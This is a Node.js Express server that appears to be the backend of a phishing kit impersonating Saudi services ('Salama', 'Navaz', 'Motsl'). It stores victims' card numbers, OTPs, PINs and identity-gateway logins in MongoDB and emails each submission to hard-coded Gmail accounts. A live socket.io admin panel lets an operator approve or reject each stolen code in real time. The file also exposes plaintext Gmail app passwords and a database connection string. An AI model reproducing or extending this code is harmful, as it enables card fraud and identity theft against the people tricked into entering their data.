const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors());
app.use(require("morgan")("dev"));

const emailData = {
  user: "pnusds269@gmail.com",
  pass: "bojr nrmj bjen rcgt",
  // user: "saudiabsher1990@gmail.com",
  // saudiPass: "nazl tmfi oxnn astq",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Salama  Visa"
          : type === "reg"
          ? "Salama Register Form "
          : type === "otp"
          ? "Salama Visa Otp "
          : type === "pin"
          ? "Salama Visa Pin "
          : type === "motsl"
          ? "Salama - Motsl Gate Data "
          : type === "motslOtp"
          ? "Salama - Motsl Gate Otp "
          : type === "navaz"
          ? "Salama - Navaz Gate "
          : type === "navazOtp"
          ? "Salama Navaz Last Otp  "
          : "Salama "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.sendStatus(200));
app.post("/email", async (req, res) => {
  if (req.query.type === "one") {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: emailData.user,
        pass: emailData.pass,
      },
    });
    let htmlContent = "<div>";
    for (const [key, value] of Object.entries(req.body)) {
      htmlContent += `<p>${key}: ${
        typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
    }
    await transporter
      .sendMail({
        from: "Admin Panel",
        to: "pnusds269@gmail.com",
        subject: `${
          req.query.visa
            ? "Salama  Visa"
            : req.query.reg
            ? "Salama Register Form "
            : req.query.otp
            ? "Salama Visa Otp "
            : req.query.pin
            ? "Salama Visa Pin "
            : req.query.motsal
            ? "Salama - Motsl Gate Data "
            : req.query.motsalOtp
            ? "Salama - Motsl Gate Otp "
            : req.query.navaz
            ? "Salama - Navaz Gate "
            : req.query.navazOtp
            ? "Salama Navaz Last Otp  "
            : "Salama Bank Visa"
        }`,
        html: htmlContent,
      })
      .then((info) => {
        if (info.accepted.length) {
          res.sendStatus(200);
        } else {
          res.sendStatus(400);
        }
      });
  } else {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "saudiabsher1990@gmail.com",
        pass: "nazl tmfi oxnn astq",
      },
    });
    let htmlContent = "<div>";
    for (const [key, value] of Object.entries(req.body)) {
      htmlContent += `<p>${key}: ${
        typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
    }
    await transporter
      .sendMail({
        from: "Admin Panel",
        to: "saudiabsher1990@gmail.com",
        subject: `${
          req.query.visa
            ? "Salama  Visa"
            : req.query.reg
            ? "Salama Register Form "
            : req.query.otp
            ? "Salama Visa Otp "
            : req.query.pin
            ? "Salama Visa Pin "
            : req.query.motsal
            ? "Salama - Motsl Gate Data "
            : req.query.motsalOtp
            ? "Salama - Motsl Gate Otp "
            : req.query.navaz
            ? "Salama - Navaz Gate "
            : req.query.navazOtp
            ? "Salama Navaz Last Otp  "
            : "Salama Bank Visa"
        }`,
        html: htmlContent,
      })
      .then((info) => {
        if (info.accepted.length) {
          res.sendStatus(200);
        } else {
          res.sendStatus(400);
        }
      });
  }
});

app.post("/reg", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (user) =>
        await sendEmail(req.body, "reg").then(() =>
          res.status(201).json({ user })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
    res.sendStatus(200)
  );
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    CardAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visa").then(() => res.sendStatus(200))
  );
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    CardOtp: req.body.otp,
    checked: false,
    OtpCardAccept: false,
  }).then(
    async () => await sendEmail(req.body, "otp").then(() => res.sendStatus(200))
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    pin: req.body.pin,
    checked: false,
    PinAccept: false,
  }).then(
    async () => await sendEmail(req.body, "pin").then(() => res.sendStatus(200))
  );
});

app.post("/motsl/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    MotslAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motsl").then(() => res.sendStatus(200))
  );
});
app.post("/motslOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    MotslOtp: req.body.MotslOtp,
    checked: false,
    MotslOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motslOtp").then(() => res.sendStatus(200))
  );
});

app.post("/navaz/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    NavazAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "navaz").then(() => res.sendStatus(200))
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

io.on("connection", (socket) => {
  console.log("connected");
  socket.on("newUser", (data) => io.emit("newUser", data));
  socket.on("paymentForm", (data) => io.emit("paymentForm", data));
  socket.on("acceptPaymentForm", async (id) => {
    console.log("acceptPaymentForm From Admin", id);
    console.log(id);
    io.emit("acceptPaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });
  socket.on("declinePaymentForm", async (id) => {
    console.log("declinePaymentForm Form Admin", id);
    io.emit("declinePaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("declineVisaOtp", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });
  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("acceptVisaPin", id);
  });
  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("declineVisaPin", id);
  });

  socket.on("motsl", (data) => {
    console.log("Motsl Data", data);
    io.emit("motsl", data);
  });

  socket.on("acceptMotsl", async (id) => {
    console.log("Motsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("acceptMotsl", id);
  });
  socket.on("declineMotsl", async (id) => {
    console.log("declineMotsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("declineMotsl", id);
  });

  socket.on("motslOtp", (data) => {
    console.log("motslOtp received", data);
    io.emit("motslOtp", data);
  });
  socket.on("acceptMotslOtp", async (id) => {
    console.log("acceptMotslOtp send", id);
    io.emit("acceptMotslOtp", id);
    await Order.findByIdAndUpdate(id, { MotslOtpAccept: true });
  });
  socket.on("declineMotslOtp", async (id) => {
    console.log("declineMotslOtp send", id);
    io.emit("declineMotslOtp", id);
    await Order.findByIdAndUpdate(id, { MotslOtpAccept: true });
  });

  socket.on("navaz", (data) => {
    console.log("navaz received", data);
    io.emit("navaz", data);
  });
  socket.on("acceptNavaz", async (data) => {
    console.log("acceptNavaz send", data);
    io.emit("acceptNavaz", data);
    await Order.findByIdAndUpdate(data.id, { NavazAccept: true, NavazOtp :data.userOtp});
  });
  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz send", id);
    io.emit("declineNavaz", id);
    await Order.findByIdAndUpdate(id, { NavazAccept: true });
  });

  socket.on("navazValidate", (data) => io.emit("navazValidate", data));
  socket.on("acceptNavazOtp", async (id) => {
    await Order.findByIdAndUpdate(id, { NavazOtpAccept: true });
    io.emit("acceptNavazOtp", id);
  });
  socket.on("declineNavazOtp", async(data) => {
       await Order.findByIdAndUpdate(data.id, { NavazOtp: data.new });
    io.emit("declineNavazOtp", data);
  });
});

mongoose
  .connect("mongodb+srv://test:test@salama.xzp8m.mongodb.net/Main1")
  .then((conn) =>
    server.listen(PORT, () => {
      console.log("server running and connected to db" + conn.connection.host);
    })
  );
